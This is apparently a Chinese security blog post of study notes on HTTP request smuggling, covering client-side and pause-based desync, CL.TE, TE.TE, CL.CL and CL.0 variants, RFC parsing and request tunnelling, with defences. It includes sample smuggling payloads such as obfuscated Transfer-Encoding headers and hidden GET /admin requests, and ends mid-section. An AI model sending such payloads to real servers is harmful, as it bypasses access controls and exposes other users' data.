是一种特定的 HTTP 请求走私攻击技术，可以使受害者的 Web 浏览器与易受攻击的网站之间的连接失去同步。它主要利用的是客户端和服务器之间在处理 HTTP 请求时的不同步现象，而不一定需要多个服务器之间的解析差异。因此，即使在单服务器环境中，也可能会受到这种攻击的影响。<br><a href="https://blog.hackall.cn/usr/uploads/2024/07/810474831.png"><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/810474831.png" alt="HTTP 请求走私漏洞详解"></a><br>当受害者访问包含恶意 JavaScript 的任意域（图中<code>evil.com</code>）上的网页时，恶意代码执行会导致受害者的浏览器向存在漏洞的网站（图中<code>example.com</code>）发出包含HTTP请求走私数据的请求，这一过程和CSRF有点相似。在服务器响应第一个请求后，走私请求会留在服务器上，从而导致与浏览器的连接不同步。后续请求会追加都走私请求后边，从而执行走私的请求，返回走私请求的响应。</p><p><a href="https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync">Client-side desync</a></p><p>这里贴一部分,感觉跟csrf有点关系利用环境有点严格,感兴趣的师傅可以看看这个文章里的</p><p><a href="https://blog.hackall.cn/pentest/1079.html">HTTP 请求走私漏洞详解 - Hack All Sec的博客</a></p><h2 id="服务器端基于暂停的不同步"><a href="#服务器端基于暂停的不同步" class="headerlink" title="服务器端基于暂停的不同步"></a>服务器端基于暂停的不同步</h2><p>当后端服务器在超时后不会关闭连接时，使用服务器端基于暂停的不同步可以引发类似<code>CL.0</code>的效果。如果我们将以下请求发送到后端服务器时：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /example <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: vulnerable-website.<span class="property">com</span></span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">34</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">GET</span> /hopefully404 <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Foo</span>: x</span><br></pre></td></tr></table></figure><p>只把请求头部分发送到后端服务器，然后停止发送请求主体部分的内容。后端服务器根据<code>Content-Length: 34</code>等待获取请求主体，但是一直没等到，直到超时并发送响应。然后发送请求主体。前端服务器将其视为初始请求的主体并通过同一连接将其转发到后端服务器。但是后端服务器已经响应了初始请求，因此把这些字节当作另一个请求的开始。当下一个请求被转发过来时，后端服务器收到的请求为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /hopefully404 <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Foo</span>: xGET /xx <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: xxx</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时我们实现 <code>CL.0</code> 的效果。<code>Apache 2.4.52</code>就容易受此影响。检测和利用此漏洞需要使用Burp的<code>Turbo Intruder</code>插件，直接在BApp store安装即可。</p><p>感兴趣的师傅可以看看这个文章里的.</p><p><a href="https://blog.hackall.cn/pentest/1079.html">HTTP 请求走私漏洞详解 - Hack All Sec的博客</a></p><h1 id="AI—-基础知识的讲解举例"><a href="#AI—-基础知识的讲解举例" class="headerlink" title="AI—-基础知识的讲解举例"></a>AI—-基础知识的讲解举例</h1><h3 id="关于ai对小总结的补充和分析"><a href="#关于ai对小总结的补充和分析" class="headerlink" title="关于ai对小总结的补充和分析"></a>关于ai对小总结的补充和分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line">### **你的笔记中的关键点与修正建议**</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### **1. 关于混淆的必要性与漏洞场景**</span><br><span class="line">**你的总结基本正确**，但需澄清以下几点：</span><br><span class="line">1. **严格模式下的走私可能性**  </span><br><span class="line">   - **TE.TE（前后端均严格遵循分块编码）**：若请求完全符合 RFC 规范（如正确终止符 `0\r\n\r\n`），**额外字符会被视为非法数据**，无法走私。此时必须通过混淆（如分块扩展、非法头注入）绕过校验。</span><br><span class="line">   - **自我污染的限制**：即使使用 `keep-alive`，严格模式下后端会拒绝非法数据，导致无法污染后续请求。你的靶场测试结果符合此逻辑。</span><br><span class="line"></span><br><span class="line">2. **CL.TE 的两种打法**  </span><br><span class="line">   - **CL 写小**：前端截断请求体，后续字符作为下一个请求（无需混淆）。</span><br><span class="line">   - **CL 写大**：用于延时检测（判断服务器是否等待更多数据），但需依赖特定服务器行为。</span><br><span class="line">   - **无需混淆**：CL.TE 本身依赖前后端解析差异，不一定需要混淆头或格式。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### **2. 混淆的定义与分类修正**</span><br><span class="line">**混淆的核心是制造解析歧义**，而不仅仅是“添加多个头”或“冲突头”。以下是更精准的分类：</span><br><span class="line"></span><br><span class="line">##### **(1) 协议头混淆**</span><br><span class="line">- **CL.TE / TE.CL**：利用 `Content-Length` 与 `Transfer-Encoding` 的优先级差异（无需额外混淆）。</span><br><span class="line">- **多值头污染**（如多个 `Transfer-Encoding`）：  </span><br><span class="line">  ```http</span><br><span class="line">  Transfer-Encoding: xchunked</span><br><span class="line">  Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><ul><li><strong>服务器行为差异</strong>：前端可能取第一个值（<code>xchunked</code>），后端取最后一个值（<code>chunked</code>）。</li></ul><h5 id="2-分块格式混淆"><a href="#2-分块格式混淆" class="headerlink" title="(2) 分块格式混淆"></a><strong>(2) 分块格式混淆</strong></h5><ul><li><strong>分块扩展</strong>：<code>0;x=1\r\n\r\n</code>，诱导服务器误判分块终止位置。</li><li><strong>非法换行符</strong>：用 <code>\n</code> 代替 <code>\r\n</code>，破坏分块解析逻辑。</li><li><strong>分块大小混淆</strong>：如十六进制大小写（<code>0X0</code> 代替 <code>0</code>）。</li></ul><h5 id="3-请求体混淆"><a href="#3-请求体混淆" class="headerlink" title="(3) 请求体混淆"></a><strong>(3) 请求体混淆</strong></h5><ul><li><strong>注入伪头</strong>：在请求体中插入类似 HTTP 头的结构（如 <code>X: Y\r\n</code>），诱导后端将其解析为新请求头。</li></ul><hr><h4 id="3-对-TE-TE-场景的补充"><a href="#3-对-TE-TE-场景的补充" class="headerlink" title="3. 对 TE.TE 场景的补充"></a><strong>3. 对 TE.TE 场景的补充</strong></h4><ul><li><p><strong>严格模式下的走私可能</strong>：<br>即使前后端均使用 <code>Transfer-Encoding</code>，若后端对分块扩展（<code>;</code>）或注释解析存在漏洞，仍可走私。例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span>;<span class="attr">x</span><span class="operator">=</span><span class="string">&quot;<span class="char escape_">\r</span><span class="char escape_">\n</span>&quot;</span>   <span class="comment"># 分块扩展参数</span></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="operator">/</span><span class="number">1.1</span>\r\n...</span></span><br></pre></td></tr></table></figure><ul><li>后端可能忽略分块扩展，误判终止位置，将 <code>GET</code> 视为新请求。</li></ul></li></ul><hr><h4 id="4-CL-CL-场景的修正"><a href="#4-CL-CL-场景的修正" class="headerlink" title="4. CL.CL 场景的修正"></a><strong>4. CL.CL 场景的修正</strong></h4><ul><li><p><strong>多 Content-Length 头的处理</strong>：<br>你的示例中构造两个 <code>Content-Length</code> 头（30 和 5），实际场景中：</p><ul><li><p><strong>RFC 规范</strong>：多个 <code>Content-Length</code> 头必须值相同，否则视为非法请求（返回 <code>400 Bad Request</code>）。</p></li><li><p><strong>实战利用条件</strong>：需服务器未严格校验多值一致性。例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5   # 合法（重复相同值）</span><br></pre></td></tr></table></figure><p>或通过空格&#x2F;TAB 绕过：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line">Content-Length :  5  # 服务器可能解析为同一头</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h4 id="5-CL-0-场景的澄清"><a href="#5-CL-0-场景的澄清" class="headerlink" title="5. CL.0 场景的澄清"></a><strong>5. CL.0 场景的澄清</strong></h4><ul><li><p><strong>本质是 CL 与默认行为的冲突</strong>：<br>前端使用 <code>Content-Length</code>，后端忽略该头并默认请求体长度为 0（或从其他上下文推断长度）。无需混淆，直接构造：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30    # 前端读取30字节</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span>\r\n...</span></span><br></pre></td></tr></table></figure><ul><li>后端可能仅处理前0字节，后续 <code>GET</code> 被保留为下一个请求。</li></ul></li></ul><hr><h3 id="总结：混淆的核心目标与实战策略"><a href="#总结：混淆的核心目标与实战策略" class="headerlink" title="总结：混淆的核心目标与实战策略"></a><strong>总结：混淆的核心目标与实战策略</strong></h3><table><thead><tr><th>漏洞类型</th><th>是否需要混淆</th><th>关键混淆手段</th><th>示例场景</th></tr></thead><tbody><tr><td><strong>CL.TE</strong></td><td>可选（依赖解析差异）</td><td>无需混淆，直接构造CL与TE冲突</td><td>前端CL截断，后端TE解析后续数据</td></tr><tr><td><strong>TE.TE</strong></td><td>必需（绕过严格校验）</td><td>分块扩展、非法换行符、多TE头污染</td><td><code>0;x=1\r\n</code> + 注入请求</td></tr><tr><td><strong>CL.CL</strong></td><td>必需（绕过多值校验）</td><td>多CL头构造（空格&#x2F;TAB混淆）</td><td><code>Content-Length : 5</code> + 非法重复</td></tr><tr><td><strong>CL.0</strong></td><td>无需（利用默认行为差异）</td><td>直接构造CL覆盖实际数据长度</td><td>前端CL大值，后端默认长度0</td></tr></tbody></table><hr><h3 id="你的测试结果解释"><a href="#你的测试结果解释" class="headerlink" title="你的测试结果解释"></a><strong>你的测试结果解释</strong></h3><p>在 TE.TE 靶场中无法自我污染的原因是：</p><ol><li><strong>靶场严格遵循 RFC</strong>：后端在解析 <code>0\r\n\r\n</code> 后立即终止请求，后续字符被丢弃。</li><li><strong>缺乏混淆手段</strong>：未使用分块扩展或非法格式，无法绕过终止符校验。</li></ol><hr><h3 id="修正后的实战建议"><a href="#修正后的实战建议" class="headerlink" title="修正后的实战建议"></a><strong>修正后的实战建议</strong></h3><ol><li><strong>明确漏洞类型</strong>：先确定目标是 CL.TE、TE.CL 还是 TE.TE。</li><li><strong>按需选择混淆</strong>：  <ul><li>CL.TE：无需混淆，直接构造 CL 与 TE 冲突。</li><li>TE.TE：必须混淆（分块扩展、非法头）。</li></ul></li><li><strong>工具辅助</strong>：使用 Burp Scanner 或 Turbo Intruder 自动探测解析差异点。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 关于RFC的讲解:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RFC（互联网技术标准）与HTTP请求解析的关系，可以比喻为**“交通规则与车辆行驶”**的关系。RFC定义了互联网通信的“规则”，而请求解析则是服务器按照这些规则“解读”客户端发送的数据。以下是通俗易懂的解释：</p><hr><h3 id="1-RFC是HTTP请求的“语法规则书”"><a href="#1-RFC是HTTP请求的“语法规则书”" class="headerlink" title="1. RFC是HTTP请求的“语法规则书”"></a><strong>1. RFC是HTTP请求的“语法规则书”</strong></h3><p>就像写作文需要遵循语法，HTTP请求必须符合RFC定义的格式，服务器才能正确理解。例如：</p><ul><li><strong>RFC 9110（HTTP&#x2F;1.1）</strong>：规定了HTTP消息的格式，如：<ul><li>请求行必须为 <code>方法 URL 协议版本</code>（如 <code>GET /index.html HTTP/1.1</code>）。</li><li>头部字段需用 <code>:</code> 分隔键值（如 <code>Host: example.com</code>）。</li><li>正文需通过 <code>Content-Length</code> 或 <code>Transfer-Encoding</code> 指定长度或分块。</li></ul></li></ul><p><strong>如果请求不按RFC写，服务器可能“读不懂”</strong>，就像写错语法的句子让人困惑。</p><hr><h3 id="2-请求解析：服务器如何“拆解”请求"><a href="#2-请求解析：服务器如何“拆解”请求" class="headerlink" title="2. 请求解析：服务器如何“拆解”请求"></a><strong>2. 请求解析：服务器如何“拆解”请求</strong></h3><p>当服务器收到HTTP请求时，会按照RFC规则逐步解析：</p><ol><li><strong>解析请求行</strong>：确认方法、URL和协议版本。</li><li><strong>解析头部</strong>：逐个读取头部字段，直到遇到空行（<code>\r\n\r\n</code>）。</li><li><strong>解析正文</strong>：<ul><li>如果有 <code>Content-Length</code>，按指定长度读取正文。</li><li>如果有 <code>Transfer-Encoding: chunked</code>，按分块格式读取（如 <code>5\r\nhello\r\n0\r\n\r\n</code>）。</li></ul></li></ol><p><strong>关键点</strong>：RFC规定了解析的每一步逻辑，服务器必须严格遵循，否则可能被攻击者利用（如请求走私）。</p><hr><h3 id="3-RFC与请求走私漏洞的关系"><a href="#3-RFC与请求走私漏洞的关系" class="headerlink" title="3. RFC与请求走私漏洞的关系"></a><strong>3. RFC与请求走私漏洞的关系</strong></h3><p>请求走私的本质是**“前后端解析不一致”**，而这种不一致往往是因为违反了RFC规则。例如：</p><h4 id="场景1：CL-TE攻击（前端用Content-Length，后端用Transfer-Encoding）"><a href="#场景1：CL-TE攻击（前端用Content-Length，后端用Transfer-Encoding）" class="headerlink" title="场景1：CL.TE攻击（前端用Content-Length，后端用Transfer-Encoding）"></a><strong>场景1：CL.TE攻击（前端用Content-Length，后端用Transfer-Encoding）</strong></h4><ul><li><p><strong>攻击请求</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6       # 前端按此长度截断</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span>\r\n\r\n               <span class="comment"># 后端按分块解析到此处结束</span></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="symbol">/1.1</span>     <span class="comment"># 前端忽略，后端视为新请求</span></span></span><br></pre></td></tr></table></figure></li><li><p><strong>RFC规则</strong>：<br>RFC规定 <code>Transfer-Encoding</code> 优先级高于 <code>Content-Length</code>。如果后端严格遵循RFC，应忽略 <code>Content-Length</code>，但某些服务器未遵守此规则，导致解析差异。</p></li></ul><h4 id="场景2：TE-TE攻击（前后端均用Transfer-Encoding，但解析不一致）"><a href="#场景2：TE-TE攻击（前后端均用Transfer-Encoding，但解析不一致）" class="headerlink" title="场景2：TE.TE攻击（前后端均用Transfer-Encoding，但解析不一致）"></a><strong>场景2：TE.TE攻击（前后端均用Transfer-Encoding，但解析不一致）</strong></h4><ul><li><p><strong>攻击请求</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked  # 混淆头</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span>\r\n\r\n</span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure></li><li><p><strong>RFC规则</strong>：<br>RFC规定多个 <code>Transfer-Encoding</code> 头时，需按顺序处理（如 <code>chunked</code> 必须最后）。若后端错误解析，可能将 <code>GET</code> 视为新请求。</p></li></ul><hr><h3 id="4-为什么混淆请求能绕过防御？"><a href="#4-为什么混淆请求能绕过防御？" class="headerlink" title="4. 为什么混淆请求能绕过防御？"></a><strong>4. 为什么混淆请求能绕过防御？</strong></h3><p>RFC虽然严格，但部分服务器实现存在“容错性”，导致攻击者可构造<strong>看似非法但实际被部分服务器接受的请求</strong>。例如：</p><ul><li><strong>分块扩展</strong>：<code>0;x=1\r\n\r\n</code>（RFC允许分块后加注释，但某些服务器可能忽略注释）。</li><li><strong>非法换行符</strong>：用 <code>\n</code> 代替 <code>\r\n</code>（RFC要求 <code>\r\n</code>，但某些服务器接受 <code>\n</code>）。</li></ul><p>这些“模糊点”让攻击者能构造混淆请求，诱导服务器错误解析。</p><hr><h3 id="总结：RFC与请求解析的关系"><a href="#总结：RFC与请求解析的关系" class="headerlink" title="总结：RFC与请求解析的关系"></a><strong>总结：RFC与请求解析的关系</strong></h3><table><thead><tr><th>角色</th><th>作用</th><th>实际影响</th></tr></thead><tbody><tr><td><strong>RFC</strong></td><td>定义HTTP请求的合法格式和解析逻辑。</td><td>确保全球服务器和客户端能互相理解。</td></tr><tr><td><strong>服务器解析</strong></td><td>按RFC规则拆解请求内容，提取方法、URL、头部、正文等。</td><td>若实现与RFC不一致，可能导致漏洞（如走私）。</td></tr><tr><td><strong>攻击者</strong></td><td>构造混淆请求，利用服务器解析漏洞，突破RFC的预期逻辑。</td><td>通过前后端解析差异实现请求走私。</td></tr></tbody></table><hr><h3 id="类比理解"><a href="#类比理解" class="headerlink" title="类比理解"></a><strong>类比理解</strong></h3><ul><li><strong>RFC</strong>：像乐高说明书，规定每块积木如何拼接。</li><li><strong>请求解析</strong>：像你按说明书拼乐高，如果某一步拼错（不符合RFC），最终模型可能不稳固（漏洞）。</li><li><strong>攻击者</strong>：像故意拼错积木的人，利用某些连接点的松动（服务器解析漏洞），让模型变成危险的陷阱。</li></ul><p>理解RFC规则，就能明白为什么某些请求能走私成功，以及如何防御（强制所有服务器严格遵循RFC）。</p><h2 id="请求隧道攻击的概念讲解"><a href="#请求隧道攻击的概念讲解" class="headerlink" title="请求隧道攻击的概念讲解:"></a>请求隧道攻击的概念讲解:</h2><h3 id="概念讲解"><a href="#概念讲解" class="headerlink" title="概念讲解:"></a>概念讲解:</h3><ul><li><h3 id="通俗易懂版：HTTP请求隧道攻击详解"><a href="#通俗易懂版：HTTP请求隧道攻击详解" class="headerlink" title="通俗易懂版：HTTP请求隧道攻击详解"></a><strong>通俗易懂版：HTTP请求隧道攻击详解</strong></h3><hr><h4 id="1-什么是HTTP请求隧道？"><a href="#1-什么是HTTP请求隧道？" class="headerlink" title="1. 什么是HTTP请求隧道？"></a><strong>1. 什么是HTTP请求隧道？</strong></h4><p>想象你寄快递时，快递员（前端服务器）负责检查包裹内容，但实际送货的是另一位快递员（后端服务器）。<strong>请求隧道</strong>就是攻击者把“违禁品”（恶意请求）藏在正常包裹里，让快递员A（前端）不检查，直接转交给快递员B（后端），从而绕过安检。</p><hr><h4 id="2-隧道-vs-传统走私的区别"><a href="#2-隧道-vs-传统走私的区别" class="headerlink" title="2. 隧道 vs 传统走私的区别"></a><strong>2. 隧道 vs 传统走私的区别</strong></h4><ul><li><strong>传统请求走私</strong>：污染快递分拣队列，让别人的包裹错发到你的地址。</li><li><strong>请求隧道</strong>：直接在包裹里藏一个“小包裹”（隧道请求），让后端处理隐藏的请求，而前端浑然不知。</li></ul><hr><h4 id="3-为什么能绕过前端安全措施？"><a href="#3-为什么能绕过前端安全措施？" class="headerlink" title="3. 为什么能绕过前端安全措施？"></a><strong>3. 为什么能绕过前端安全措施？</strong></h4><ul><li><strong>前端只做表面检查</strong>：比如检查快递单号（URL路径），但不拆开包裹看内容（请求体）。</li><li><strong>后端老实处理所有内容</strong>：只要包裹送到，后端会拆开所有隐藏的小包裹（隧道请求）。</li></ul><hr><h3 id="🌰-生活化案例"><a href="#🌰-生活化案例" class="headerlink" title="🌰 生活化案例"></a><strong>🌰 生活化案例</strong></h3><ul><li><p><strong>攻击场景</strong>：某网站禁止普通用户访问<code>/admin</code>，但后端实际存在该接口。</p></li><li><p>攻击步骤</p><p>：</p><ol><li>你发送一个“正常包裹”（合法请求），里面藏了一个“小包裹”（<code>GET /admin</code>）。</li><li>前端检查快递单号（URL）没问题，转交给后端。</li><li>后端拆开包裹，处理两个请求：正常请求 + 隐藏的<code>/admin</code>请求。</li><li>后端把两个响应打包返回，但前端只看到正常响应，隐藏的<code>/admin</code>数据被你窃取。</li></ol></li></ul><hr><h3 id="🔧-技术细节拆解"><a href="#🔧-技术细节拆解" class="headerlink" title="🔧 技术细节拆解"></a><strong>🔧 技术细节拆解</strong></h3><h4 id="HTTP-1-与-HTTP-2-的隧道差异"><a href="#HTTP-1-与-HTTP-2-的隧道差异" class="headerlink" title="HTTP&#x2F;1 与 HTTP&#x2F;2 的隧道差异"></a><strong>HTTP&#x2F;1 与 HTTP&#x2F;2 的隧道差异</strong></h4><table><thead><tr><th><strong>对比项</strong></th><th><strong>HTTP&#x2F;1 环境</strong></th><th><strong>HTTP&#x2F;2 环境</strong></th></tr></thead><tbody><tr><td><strong>检测难度</strong></td><td>高（响应混杂，难区分）</td><td>低（每个请求&#x2F;响应有独立“流”）</td></tr><tr><td><strong>利用特征</strong></td><td>响应可能包含多个混杂内容</td><td>响应中可明显看到HTTP&#x2F;1格式的“走私响应”</td></tr><tr><td><strong>示例</strong></td><td>前端返回的数据里夹带私货（需手动解析）</td><td>直接看到类似<code>HTTP/1.1 200 OK</code>的完整响应头</td></tr></tbody></table><hr><h4 id="盲隧道-vs-非盲隧道"><a href="#盲隧道-vs-非盲隧道" class="headerlink" title="盲隧道 vs 非盲隧道"></a><strong>盲隧道 vs 非盲隧道</strong></h4><h5 id="盲隧道（你蒙着眼攻击）"><a href="#盲隧道（你蒙着眼攻击）" class="headerlink" title="盲隧道（你蒙着眼攻击）"></a><strong>盲隧道（你蒙着眼攻击）</strong></h5><ul><li><p>特征</p><p>：</p><ul><li>前端只返回主请求的响应，隐藏请求的响应被忽略。</li><li>攻击者无法直接看到隐藏请求的结果。</li></ul></li><li><p>利用场景</p><p>：</p><ul><li>触发后台操作（如删除数据、发送邮件）。</li><li>需要间接验证（如观察系统状态变化）。</li></ul></li></ul><h5 id="非盲隧道（睁着眼攻击）"><a href="#非盲隧道（睁着眼攻击）" class="headerlink" title="非盲隧道（睁着眼攻击）"></a><strong>非盲隧道（睁着眼攻击）</strong></h5><ul><li><p>特征</p><p>：</p><ul><li>隐藏请求的响应会“泄露”到主请求的响应中。</li><li>攻击者可直接窃取数据（如Cookie、敏感页面）。</li></ul></li><li><p>示例攻击</p><p>：</p><ol><li>构造一个<code>HEAD</code>请求包裹，隐藏<code>GET /admin</code>请求。</li><li>前端认为<code>HEAD</code>请求的响应长度应为131字节。</li><li>后端返回<code>HEAD</code>响应 + <code>/admin</code>的完整响应（总长度超过131）。</li><li>前端只读取前131字节，但攻击者能从后续字节中提取<code>/admin</code>数据。</li></ol></li></ul><hr><h3 id="⚡-攻击步骤（以非盲隧道为例）"><a href="#⚡-攻击步骤（以非盲隧道为例）" class="headerlink" title="⚡ 攻击步骤（以非盲隧道为例）"></a><strong>⚡ 攻击步骤（以非盲隧道为例）</strong></h3><h4 id="1-构造隧道请求"><a href="#1-构造隧道请求" class="headerlink" title="1. 构造隧道请求"></a><strong>1. 构造隧道请求</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD /comment HTTP/2 </span><br><span class="line">Host: vulnerable-website.com  </span><br><span class="line">A: 1 </span><br><span class="line"> </span><br><span class="line">GET /tunnelled HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com  </span><br><span class="line">X: x </span><br></pre></td></tr></table></figure><ul><li><p>关键点</p><p>：</p><ul><li>主请求是<code>HEAD /comment</code>（前端认为无响应体）。</li><li>隐藏请求是<code>GET /tunnelled</code>（后端会处理并返回数据）。</li></ul></li></ul><h4 id="2-分析响应"><a href="#2-分析响应" class="headerlink" title="2. 分析响应"></a><strong>2. 分析响应</strong></h4><ul><li><p>正常响应</p><p>（无隧道）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http复制HTTP/2 200 OK </span><br><span class="line">Content-Length: 131 </span><br><span class="line">（空响应体，因为HEAD请求）</span><br></pre></td></tr></table></figure></li><li><p>隧道成功响应</p><p>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http复制HTTP/2 200 OK </span><br><span class="line">Content-Length: 131  # 前端只读到这里 </span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK      # 隐藏响应的内容从这里开始泄露 </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 4286 </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;h1&gt;Tunnelled&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is a tunnelled respo...</span><br></pre></td></tr></table></figure></li><li><p><strong>攻击者收获</strong>：窃取了<code>/tunnelled</code>页面的前131字节内容。</p></li></ul><hr><h3 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a><strong>🛡️ 防御措施</strong></h3><ol><li><p>严格校验请求边界</p><p>：</p><ul><li>禁止同时包含<code>Content-Length</code>和<code>Transfer-Encoding</code>头。</li></ul></li><li><p>禁用连接复用</p><p>：</p><ul><li>前后端之间强制使用<code>Connection: close</code>。</li></ul></li><li><p>隔离用户请求</p><p>：</p><ul><li>确保同一连接仅处理同一用户的请求（通过IP或Session绑定）。</li></ul></li><li><p>监控异常响应</p><p>：</p><ul><li>检测响应中是否包含其他请求的数据（如HTTP&#x2F;1响应混入HTTP&#x2F;2流）。</li></ul></li></ol><hr><h3 id="📌-总结"><a href="#📌-总结" class="headerlink" title="📌 总结"></a><strong>📌 总结</strong></h3><ul><li><strong>请求隧道是高级走私技术</strong>：专攻前端“偷懒检查”的弱点，让后端处理隐藏请求。</li><li><strong>HTTP&#x2F;2更易检测</strong>：因响应格式清晰，而HTTP&#x2F;1需手动“挖宝”。</li><li><strong>防御核心</strong>：前后端统一解析规则 + 严格隔离用户请求。</li></ul></li></ul><hr><h4 id="1-什么是“隧道”（Tunneling）？"><a href="#1-什么是“隧道”（Tunneling）？" class="headerlink" title="1. 什么是“隧道”（Tunneling）？"></a><strong>1. 什么是“隧道”（Tunneling）？</strong></h4><p>在HTTP请求走私中，<strong>“隧道”指将恶意请求隐藏在合法请求中</strong>，利用前后端服务器对协议解析的差异，绕过前端安全检查，使后端处理隐藏的请求。<strong>核心特征</strong>：</p><ul><li><strong>一个请求通道传输多个请求</strong>：前端认为只发送了一个请求，后端却处理了多个请求。</li><li><strong>隐藏请求的执行结果</strong>：恶意请求的响应可能被前端忽略或部分截取，但攻击效果已达成。</li></ul><hr><h3 id="📌-攻击步骤中的隧道体现"><a href="#📌-攻击步骤中的隧道体现" class="headerlink" title="📌 攻击步骤中的隧道体现"></a><strong>📌 